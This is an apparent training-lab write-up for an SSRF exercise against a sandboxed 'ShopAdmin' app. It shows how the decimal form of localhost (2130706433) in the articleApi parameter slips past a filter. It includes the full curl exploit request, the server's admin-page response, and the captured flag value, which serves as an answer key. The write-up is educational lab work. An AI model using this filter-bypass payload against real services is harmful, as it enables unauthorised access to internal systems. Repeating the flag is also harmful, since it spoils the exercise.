# Task 1. Is our security a fortress or a sieve? Let's SSRF and find out!


## **Task Description**



![homer-ssrf](https://assets-global.website-files.com/64233a8baf1eba1d72a641d4/65a358da60ce224014a578f4_homer-ssrf.jpeg)

Following a thorough pentest, security measures were implemented to address known vulnerabilities. What about now, is it secure?\


It's time to put our defenses to the test and see if they can weather the storm of cyber threats. Your mission is to assess the effectiveness of these security enhancements and determine whether the system remains susceptible to SSRF attacks.\


Even after adding mitigations, this stage remains focused on the SSRF vulnerability within the check reduction functionality. Let's see if our enhancements are enough to secure the system

- Target Application: [ShopAdmin](https://intranet-dlh.hbtn.io/rltoken/hb7JZuIBgk0CPLOJO6x6jw)
- Initial Endpoint: `http://web0x08.hbtn/app2/`

---

Useful instructions:

1. Log into ShopAdmin, it is a shopping website, there is a lot of article.
2. The challenge is about the SSRF vulnerability in check reduction functionality.
3. You can click on one article and we see that we can do a check reduction.
4. Bypass the filter by providing decimal representation of the localhost.
5. This App is Forwarded on Port 3001



**Repo:**

- GitHub repository: `dlh-cyber_security`
- Directory: `web_application_security/0x08_ssrf`
- File: `1-flag.txt`




## **Solution**



- Start sandbox `cyber_websec_0x08`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.

```bash
echo "10.42.254.214 web0x08.hbtn" | sudo tee -a /etc/hosts
```


## Task 1, Step 1: Bypass the SSRF filter using decimal localhost

This task builds directly on Task 0. The vulnerability is still in `articleApi`, but the application now has additional security filtering.

The hint tells us exactly what to investigate: bypassing localhost restrictions using its decimal IP representation.

### How the bypass works

These two addresses represent the same IPv4 address:

| Representation | Address      |
| -------------- | ------------ |
| Standard IPv4  | `127.0.0.1`  |
| Decimal IPv4   | `2130706433` |

$$
127 * 256^3 + 0 * 256^2 + 0 * 256^1 + 1 * 256^0 = 2130706433
$$

Some URL parsers accept `2130706433` as an alternative representation of `127.0.0.1`.

If the security filter blocks the literal string `127.0.0.1` but doesn't normalize IP addresses before checking them, we may be able to bypass it.

### Action: Execute this command in Kali

```
curl -sS -i -X POST 'http://web0x08.hbtn/app2/check-reduction' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://2130706433:3001/admin/list-of-items'
```

### Why this command?

We're using the same SSRF technique that worked in Task 0, with three changes:

- `/app2/check-reduction`: Targets the second application.
- `2130706433`: Uses the decimal representation of localhost to attempt a filter bypass.
- `3001`: Targets the internal port specified in Task 1.

We're also testing `/admin/list-of-items` because that endpoint contained the flag in Task 0. We haven't established whether it exists in Task 1.


```bash
curl -sS -i -X POST 'http://web0x08.hbtn/app2/check-reduction' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'articleApi=http://2130706433:3001/admin/list-of-items'
# HTTP/1.1 200 OK
# Server: nginx/1.18.0
# Date: Mon, 09 Nov 2026 19:17:03 GMT
# Content-Type: text/html; charset=utf-8
# Content-Length: 1454
# Connection: keep-alive
# X-Powered-By: Express
# ETag: W/"5ae-/ICwYJRaY1SHzOgEEmGBg8xCt8M"
#
# <!DOCTYPE html>
# <html lang="en">
#   <head>
#     <base href="/app2/">
#     <meta charset="UTF-8" />
#     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
#     <title>Admin Items</title>
#     <link
#       rel="stylesheet"
#       href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
#     />
#     <link rel="stylesheet" href="/css/adminstyle.css" />
#   </head>
#   <body>
#     <header>
#       <h1>Admin Items</h1>
#       <nav>
#         <ul>
#           <li><a href="/app2/admin/dashboard">Dashboard</a></li>
#           <li><a href="/app2/admin/list-of-items">Items</a></li>
#         </ul>
#       </nav>
#     </header>
#     <div class="container mt-5">
#       <table class="table table-striped">
#         <thead>
#           <tr>
#             <th>ID</th>
#             <th>Name</th>
#             <th>Description</th>
#             <th>Price</th>
#           </tr>
#         </thead>
#         <tbody>
#           <tr>
#             <td>1</td>
#             <td>FLAG_1</td>
#             <td>23115af2a90ca648e16090845643f75d</td>
#             <td>500</td>
#           </tr>
#         </tbody>
#       </table>
#     </div>
#     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
#     <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.5.3/dist/umd/popper.min.js"></script>
#     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
#   </body>
# </html>
```

## Task 1, Step 2: Save the flag

SSRF filter bypass successful!

The application accepted the decimal representation of localhost and returned the internal admin items page.

We found:

| Field                | Value                              |
| -------------------- | ---------------------------------- |
| Flag name            | `FLAG_1`                           |
| Flag value           | `23115af2a90ca648e16090845643f75d` |
| Vulnerable parameter | `articleApi`                       |
| Bypass technique     | Decimal IPv4 (`2130706433`)        |
| Internal port        | `3001`                             |



### Action: Save FLAG_1

From the root of your `dlh-cyber_security` repository, execute:

```bash
echo '23115af2a90ca648e16090845643f75d' > 1-flag.txt
git add .
git commit -m "1-flag.txt"
git push
```

